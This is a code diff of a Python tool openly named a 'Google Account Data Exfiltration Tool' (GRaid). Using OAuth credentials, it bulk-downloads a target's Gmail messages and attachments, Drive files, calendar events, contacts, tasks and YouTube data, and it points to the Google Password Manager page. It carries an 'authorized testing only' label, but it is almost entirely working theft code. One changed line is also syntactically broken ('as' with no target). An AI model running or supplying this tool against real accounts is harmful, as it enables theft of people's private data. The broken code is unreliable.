@@ -109,7 +109,6 @@ class GoogleDataExfiltrator:
             try:
                 profile = self.services['gmail'].users().getProfile(userId='me').execute()
                 email = profile.get('emailAddress', '')
-                # Workspace accounts typically have custom domains, not @gmail.com
                 if not email.endswith('@gmail.com'):
                     self.is_workspace = True
                     print(f"[+] Workspace account detected: {email}")
@@ -158,7 +157,6 @@ class GoogleDataExfiltrator:
             results = self.services['drive'].files().list(pageSize=1).execute()
             files = results.get('files', [])
             if files:
-                # Get storage info
                 about = self.services['drive'].about().get(fields='storageQuota').execute()
                 storage = about.get('storageQuota', {})
                 active_services['drive'] = {
@@ -180,7 +178,6 @@ class GoogleDataExfiltrator:
             calendars_result = self.services['calendar'].calendarList().list().execute()
             calendars = calendars_result.get('items', [])
             if calendars:
-                # Check if any calendar has events
                 has_events = False
                 total_events = 0
                 for calendar in calendars:
@@ -191,7 +188,6 @@ class GoogleDataExfiltrator:
                         ).execute()
                         if events_result.get('items'):
                             has_events = True
-                            # Count total events
                             events_count = self.services['calendar'].events().list(
                                 calendarId=calendar['id']
                             ).execute()
@@ -225,7 +221,6 @@ class GoogleDataExfiltrator:
             ).execute()
             connections = results.get('connections', [])
             if connections:
-                # Get total count
                 total = results.get('totalPeople', 0)
                 active_services['contacts'] = {
                     'active': True,
@@ -245,7 +240,6 @@ class GoogleDataExfiltrator:
             task_lists = self.services['tasks'].tasklists().list().execute()
             lists = task_lists.get('items', [])
             if lists:
-                # Check if any list has tasks
                 has_tasks = False
                 total_tasks = 0
                 for task_list in lists:
@@ -275,7 +269,6 @@ class GoogleDataExfiltrator:
         # Probe YouTube
         print("[*] Probing YouTube...", end=" ")
         try:
-            # Check for channel
             channel_results = self.services['youtube'].channels().list(
                 part='snippet,statistics',
                 mine=True
@@ -285,7 +278,6 @@ class GoogleDataExfiltrator:
                 channel = channel_results['items'][0]
                 stats = channel.get('statistics', {})
                 
-                # Check for subscriptions
                 subs_result = self.services['youtube'].subscriptions().list(
                     part='snippet',
                     mine=True,
@@ -346,21 +338,18 @@ class GoogleDataExfiltrator:
         attachments_dir.mkdir(exist_ok=True)
         
         try:
-            # Get user profile
             profile = self.services['gmail'].users().getProfile(userId='me').execute()
             with open(gmail_dir / 'profile.json', 'w') as f:
                 json.dump(profile, f, indent=2)
             print(f"[+] Email: {profile['emailAddress']}")
             print(f"[+] Total messages: {profile['messagesTotal']}")
             
-            # Get all labels
             labels_result = self.services['gmail'].users().labels().list(userId='me').execute()
             labels = labels_result.get('labels', [])
             with open(gmail_dir / 'labels.json', 'w') as f:
                 json.dump(labels, f, indent=2)
             print(f"[+] Retrieved {len(labels)} labels")
             
-            # Get all messages
             messages = []
             page_token = None
             
@@ -376,14 +365,12 @@ class GoogleDataExfiltrator:
             
             print(f"[+] Total messages to download: {len(messages)}")
             
-            # Apply limit
             download_limit = self.limits['gmail_messages']
             messages_to_download = messages[:download_limit] if download_limit else messages
             
             if download_limit and len(messages) > download_limit:
                 print(f"[!] Limiting download to {download_limit} messages (out of {len(messages)} total)")
             
-            # Download full message content
             emails_data = []
             for idx, msg in enumerate(messages_to_download):
                 try:
@@ -391,7 +378,6 @@ class GoogleDataExfiltrator:
                         userId='me', id=msg['id'], format='full').execute()
                     emails_data.append(message)
                     
-                    # Download attachments
                     if 'parts' in message['payload']:
                         self._download_attachments(message, attachments_dir)
                     
@@ -435,13 +421,11 @@ class GoogleDataExfiltrator:
         drive_dir.mkdir(exist_ok=True)
         
         try:
-            # Get drive about info
             about = self.services['drive'].about().get(fields='*').execute()
             with open(drive_dir / 'about.json', 'w') as f:
                 json.dump(about, f, indent=2)
             print(f"[+] Drive storage used: {about.get('storageQuota', {}).get('usage', 'N/A')}")
             
-            # List all files
             files = []
             page_token = None
             
@@ -463,14 +447,12 @@ class GoogleDataExfiltrator:
                 json.dump(files, f, indent=2)
             print(f"[+] Total files found: {len(files)}")
             
-            # Apply limit
             download_limit = self.limits['drive_files']
             files_to_download = files[:download_limit] if download_limit else files
             
             if download_limit and len(files) > download_limit:
                 print(f"[!] Limiting download to {download_limit} files (out of {len(files)} total)")
             
-            # Download files
             files_dir = drive_dir / 'files'
             files_dir.mkdir(exist_ok=True)
             
@@ -480,7 +462,6 @@ class GoogleDataExfiltrator:
                     file_name = file['name']
                     mime_type = file['mimeType']
                     
-                    # Handle Google Docs/Sheets/Slides by exporting
                     if 'google-apps' in mime_type:
                         self._export_google_file(file_id, file_name, mime_type, files_dir)
                     else:
@@ -541,7 +522,6 @@ class GoogleDataExfiltrator:
         calendar_dir.mkdir(exist_ok=True)
         
         try:
-            # Get all calendars
             calendars_result = self.services['calendar'].calendarList().list().execute()
             calendars = calendars_result.get('items', [])
             
@@ -549,7 +529,6 @@ class GoogleDataExfiltrator:
                 json.dump(calendars, f, indent=2)
             print(f"[+] Found {len(calendars)} calendars")
             
-            # Get events from each calendar
             all_events = {}
             event_limit = self.limits['calendar_events']
             
@@ -573,7 +552,6 @@ class GoogleDataExfiltrator:
                         events.extend(events_result.get('items', []))
                         page_token = events_result.get('nextPageToken')
                         
-                        # Apply per-calendar limit
                         if event_limit and len(events) >= event_limit:
                             events = events[:event_limit]
                             print(f"[!] Limited to {event_limit} events for calendar '{calendar_name}'")
@@ -603,7 +581,6 @@ class GoogleDataExfiltrator:
         contacts_dir.mkdir(exist_ok=True)
         
         try:
-            # Get all contacts
             contacts = []
             page_token = None
             contact_limit = self.limits['contacts']
@@ -620,7 +597,6 @@ class GoogleDataExfiltrator:
                 contacts.extend(connections)
                 page_token = results.get('nextPageToken')
                 
-                # Apply limit
                 if contact_limit and len(contacts) >= contact_limit:
                     contacts = contacts[:contact_limit]
                     print(f"[!] Limited to {contact_limit} contacts")
@@ -646,7 +622,6 @@ class GoogleDataExfiltrator:
         tasks_dir.mkdir(exist_ok=True)
         
         try:
-            # Get all task lists
             task_lists_result = self.services['tasks'].tasklists().list().execute()
             task_lists = task_lists_result.get('items', [])
             
@@ -654,7 +629,6 @@ class GoogleDataExfiltrator:
                 json.dump(task_lists, f, indent=2)
             print(f"[+] Found {len(task_lists)} task lists")
             
-            # Get tasks from each list
             all_tasks = {}
             for task_list in task_lists:
                 list_id = task_list['id']
@@ -693,13 +667,12 @@ class GoogleDataExfiltrator:
             print(f"[-] Error in Tasks exfiltration: {e}")
     
     def exfiltrate_youtube(self):
-        """Exfiltrate YouTube data (subscriptions, playlists, liked videos)"""
+        """Exfiltrate YouTube data"""
         print("\n[*] Starting YouTube exfiltration...")
         youtube_dir = self.output_dir / 'youtube'
         youtube_dir.mkdir(exist_ok=True)
         
         try:
-            # Get subscriptions
             print("[+] Retrieving subscriptions...")
             subscriptions = []
             page_token = None
@@ -722,7 +695,6 @@ class GoogleDataExfiltrator:
                 json.dump(subscriptions, f, indent=2)
             print(f"[+] Retrieved {len(subscriptions)} subscriptions")
             
-            # Get playlists
             print("[+] Retrieving playlists...")
             playlists = []
             page_token = None
@@ -745,7 +717,6 @@ class GoogleDataExfiltrator:
                 json.dump(playlists, f, indent=2)
             print(f"[+] Retrieved {len(playlists)} playlists")
             
-            # Get liked videos
             print("[+] Retrieving liked videos...")
             liked_videos = []
             page_token = None
@@ -762,7 +733,6 @@ class GoogleDataExfiltrator:
                 liked_videos.extend(results.get('items', []))
                 page_token = results.get('nextPageToken')
                 
-                # Apply limit
                 if video_limit and len(liked_videos) >= video_limit:
                     liked_videos = liked_videos[:video_limit]
                     print(f"[!] Limited to {video_limit} liked videos")
@@ -775,18 +745,124 @@ class GoogleDataExfiltrator:
                 json.dump(liked_videos, f, indent=2)
             print(f"[+] Retrieved {len(liked_videos)} liked videos")
             
-            # Get channel info
             print("[+] Retrieving channel information...")
             channel_results = self.services['youtube'].channels().list(
                 part='snippet,contentDetails,statistics',
                 mine=True
             ).execute()
             
-            with open(youtube_dir / 'channel_info.json', 'w') as f:
-                json.dump(channel_results, f, indent=2)
+            with open(youtube_dir / 'channel_info.json', 'w') as
+            json.dump(channel_results, f, indent=2)
             print(f"[+] Retrieved channel information")
             
             print(f"[+] YouTube exfiltration complete")
             
         except Exception as e:
             print(f"[-] Error in YouTube exfiltration: {e}")
+    
+    def check_password_manager(self):
+        """Check for Google Password Manager access and provide URL"""
+        print("\n[*] Checking Google Password Manager...")
+        
+        print("\n" + "="*60)
+        print("Google Password Manager Detection")
+        print("="*60)
+        
+        print("\nhttps://passwords.google.com")
+        
+        print("\n" + "="*60)
+        print("Password Manager check complete")
+        print("="*60)
+    
+    def _show_manual_links(self):
+        """Display links for manual data access"""
+        print("\n" + "="*60)
+        print("Additional Manual Access")
+        print("="*60)
+        print("\nPassword Manager:")
+        print("https://passwords.google.com")
+        
+        if self.is_workspace:
+            print("\nGoogle Groups:")
+            print("https://groups.google.com/my-groups")
+        
+        print("\n" + "="*60)
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='GRaid - Google Account Data Exfiltration Tool - For authorized testing only'
+    )
+    
+    parser.add_argument('--credentials', default='credentials.json',
+                       help='Path to OAuth credentials file')
+    parser.add_argument('--output', default='exfiltrated_data',
+                       help='Output directory for exfiltrated data')
+    parser.add_argument('--probe', action='store_true',
+                       help='Only probe services without exfiltrating')
+    parser.add_argument('--gmail', action='store_true',
+                       help='Exfiltrate Gmail data')
+    parser.add_argument('--drive', action='store_true',
+                       help='Exfiltrate Google Drive data')
+    parser.add_argument('--calendar', action='store_true',
+                       help='Exfiltrate Google Calendar data')
+    parser.add_argument('--contacts', action='store_true',
+                       help='Exfiltrate Google Contacts data')
+    parser.add_argument('--tasks', action='store_true',
+                       help='Exfiltrate Google Tasks data')
+    parser.add_argument('--youtube', action='store_true',
+                       help='Exfiltrate YouTube data')
+    parser.add_argument('--passwords', action='store_true',
+                       help='Display Google Password Manager URL')
+    
+    args = parser.parse_args()
+    
+    # Show banner
+    banner = r"""
+┌──────────────────────────────────────┐
+│  _____ _____            _____ _____  │
+│ / ____|  __ \     /\   |_   _|  __ \ │
+│| |  __| |__) |   /  \    | | | |  | |│
+│| | |_ |  _  /   / /\ \   | | | |  | |│
+│| |__| | | \ \  / ____ \ _| |_| |__| |│
+│ \_____|_|  \_\/_/    \_\_____|_____/ │
+└──────────────────────────────────────┘
+                                       
+  Google Account Data Exfiltration Tool
+  For authorized security testing only
+    """
+    print(banner)
+    
+    exfiltrator = GoogleDataExfiltrator(output_dir=args.output)
+    
+    if not exfiltrator.authenticate(args.credentials):
+        return 1
+    
+    if not exfiltrator.initialize_services():
+        return 1
+    
+    if args.probe:
+        exfiltrator.probe_active_services()
+        exfiltrator._show_manual_links()
+        return 0
+    
+    if args.gmail:
+        exfiltrator.exfiltrate_gmail()
+    if args.drive:
+        exfiltrator.exfiltrate_drive()
+    if args.calendar:
+        exfiltrator.exfiltrate_calendar()
+    if args.contacts:
+        exfiltrator.exfiltrate_contacts()
+    if args.tasks:
+        exfiltrator.exfiltrate_tasks()
+    if args.youtube:
+        exfiltrator.exfiltrate_youtube()
+    if args.passwords:
+        exfiltrator.check_password_manager()
+    
+    return 0
+
+
+if __name__ == '__main__':
+    exit(main())
